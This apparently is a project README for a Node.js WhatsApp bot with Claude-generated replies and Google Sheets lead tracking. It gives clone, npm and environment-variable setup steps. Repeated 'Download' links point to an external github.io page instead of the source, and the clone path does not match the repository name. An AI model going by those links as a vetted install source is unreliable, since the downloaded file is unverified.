# B2K Bot v0.0.0 - WhatsApp bot engine 2026

> **B2K Bot is a Node.js engine for WhatsApp automation, combining official webhook handling, Claude-generated replies, and Google Sheets CRM workflows in a configurable application.**

[![Platform](https://img.shields.io/badge/Platform-Node.js-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v0.0.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/oliveryoungwt2136/b2k-bot-webhook-crm?style=flat-square)](https://github.com/oliveryoungwt2136/b2k-bot-webhook-crm)

---

<p align="center">
  <a href="https://oliveryoungwt2136.github.io/b2k-bot-webhook-crm/">
    <img src="https://img.shields.io/badge/Download-B2K%20Bot%20Latest-brightgreen?style=for-the-badge" alt="Download B2K Bot">
  </a>
</p>

> **[Download B2K Bot v0.0.0](https://oliveryoungwt2136.github.io/b2k-bot-webhook-crm/)**

---

[Download Latest Build](https://oliveryoungwt2136.github.io/b2k-bot-webhook-crm/)

---

## What B2K Bot Does

B2K Bot gives teams a repeatable way to manage WhatsApp conversations without manually composing every response. Incoming messages arrive through an official webhook process, while configured business information helps generate useful replies and move each conversation forward.

It is also intended for workflows where WhatsApp questions should become organized, trackable leads. The bot can record lead details in Google Sheets, notify the owner when a message suggests booking intent, and use environment variables to adapt the setup for different projects and deployments.

---

## Core Capabilities

- Accepts WhatsApp messages through an official webhook connection
- Uses Claude and supplied business context to create responses
- Automatically records leads in a Google Sheets CRM
- Notifies the owner when booking intent is identified
- Supports project-specific configuration through environment variables
- Runs as a Node.js service with an Express-based backend
- Can be included in deployment workflows using Railway
- Focuses on WhatsApp automation and lead processing

---

## Getting Started

First, clone the repository and install its Node.js packages:

    git clone https://github.com/oliveryoungwt2136/b2k-bot-webhook-crm.git
    cd b2k-bot
    npm install

Once the dependencies are installed, configure the required environment values and launch the application with the project start command:

    npm run start

For a Railway deployment or another hosted environment, enter the same variables in the platform's deployment configuration before starting the service.

---

## Running the Bot

Use the following sequence to prepare a working deployment:

1. Point the WhatsApp webhook at the application's endpoint.
2. Provide the business information Claude should use when composing replies.
3. Connect the Google Sheets account and identify the CRM sheet.
4. Configure the destination for owner alerts related to booking requests.
5. Start the service and submit a test message through WhatsApp.
6. Confirm that the response, lead record, and notification are produced correctly.

To run the service locally, use:

    npm run start

After startup, B2K Bot waits for inbound webhook events, builds replies from the configured business context, and records applicable lead activity in the connected Google Sheet.

---

## Environment Configuration

All instance-specific settings are supplied through environment variables. This avoids embedding project values in the application and allows local and hosted deployments to use separate configurations. Values can be placed in a local `.env` file or entered in the environment provided by your deployment platform.

Example configuration:

    WHATSAPP_WEBHOOK_URL=
    CLAUDE_API_KEY=
    GOOGLE_SHEETS_ID=
    OWNER_NOTIFY_TARGET=
    BUSINESS_CONTEXT=

Use values appropriate for your WhatsApp integration, Claude account, Google Sheets CRM, notification destination, and business setup.

---

## Prerequisites

- A Node.js runtime
- An environment capable of running an Express-compatible server
- Access to a WhatsApp webhook integration
- Claude API access for generating replies
- A Google Sheets account or workspace for CRM records
- A hosting target such as Railway for hosted execution, if required
- Support for environment variables used by the project

---

## Frequently Asked Questions

**How can I bring the bot up to date?**  
Pull the newest repository changes, check whether additional environment variables were introduced, apply the updated configuration, and restart the service.

**Where does the project keep its configuration?**  
Settings are supplied through environment variables instead of fixed values in the source, allowing each project instance to maintain its own configuration.

**What should I check when WhatsApp messages do not reach the bot?**  
Verify the webhook URL and confirm that the server is available. Review deployment logs as well, and make sure the WhatsApp integration targets the correct application endpoint.

**What can prevent Claude replies from being created?**  
Check that the Claude API credentials and business context are defined in the environment, then confirm that incoming requests are reaching the response handler.

**Why is the Google Sheets CRM empty?**  
Inspect the configured sheet ID and account permissions, and verify the remaining CRM-related configuration values before trying another test.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
